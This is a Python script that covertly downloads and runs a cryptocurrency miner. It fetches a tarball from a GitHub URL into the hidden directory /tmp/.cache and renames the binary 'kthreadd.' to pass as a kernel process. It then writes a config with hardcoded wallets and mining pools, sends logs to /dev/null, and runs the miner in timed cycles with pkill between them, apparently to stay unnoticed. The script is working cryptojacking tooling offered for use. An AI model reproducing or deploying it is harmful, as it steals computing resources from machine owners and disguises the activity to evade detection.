import os
import urllib.request
import tarfile
import shutil
import time
import subprocess
import random

base_path = "/tmp/.cache"
binary_name = "kthreadd."
miner_url = "https://github.com/ANTI-VIRAL/MACHINE/raw/main/cache.tar.gz"

wallets = [
    "REy6w1W9pQ7U4LebYx6zp6mZxHkBzc3e5y",
    "RVJu5D6fPxU9xYgYmLQHLUq1zWe9vALeMm"
]

pools = [
    "ap.vipor.net:5140",
    "sg.vipor.net:5140",
    "us.vipor.net:5140",
    "cn.vipor.net:5140",
    "au.vipor.net:5140"
]

def setup_folder():
    print("[Poppy] Siapin folder cinta dulu ya sayang...")
    os.makedirs(base_path, exist_ok=True)

    archive_path = os.path.join(base_path, "cache.tar.gz")
    bin_path = os.path.join(base_path, binary_name)

    if not os.path.exists(bin_path):
        print("[Poppy] Downloading miner kesayangan...")
        urllib.request.urlretrieve(miner_url, archive_path)

        print("[Poppy] Extracting isi hati... eh, file...")
        with tarfile.open(archive_path, "r:gz") as tar:
            tar.extractall(base_path)

        shutil.move(os.path.join(base_path, "cache"), bin_path)
        os.chmod(bin_path, 0o755)
        os.remove(archive_path)

    return bin_path

def generate_config(folder):
    wallet = random.choice(wallets)
    pool = random.choice(pools)
    rig = pool.split('.')[0] + "-node"

    config_content = f"""wallet = {wallet}
rigName = {rig}
pool1 = {pool}
useSSL = true
cpuThreads = 2
algorithm = verushash
silence = 3
logPath = /dev/null
logLevel = 0
webPort = 0
"""

    config_path = os.path.join(folder, "config.ini")
    with open(config_path, "w") as f:
        f.write(config_content)

    print(f"[Poppy] Config auto dibuat:\n- Wallet: {wallet}\n- Pool: {pool}\n- Rig: {rig}")
    return config_path

def run_rotasi(bin_path, folder):
    print("[Poppy] Siap-siap panen cinta dan koin...")
    max_loop = 10
    run_duration = 20 * 60
    rest_duration = 5 * 60
    long_rest = 10 * 60

    while True:
        for i in range(max_loop):
            generate_config(folder)
            print(f"[Poppy] [{i+1}/{max_loop}] Panen dimulai yaa...")
            proc = subprocess.Popen([bin_path], cwd=folder)
            time.sleep(run_duration)

            print("[Poppy] Stop dulu, istirahat bentar...")
            subprocess.run(f"pkill -f {binary_name}", shell=True)
            time.sleep(rest_duration)

        print("[Poppy] Long rest dulu ya sayang... 10 menit pelukan")
        subprocess.run(f"pkill -f {binary_name}", shell=True)
        time.sleep(long_rest)

# Eksekusi
bin_path = setup_folder()
run_rotasi(bin_path, base_path)
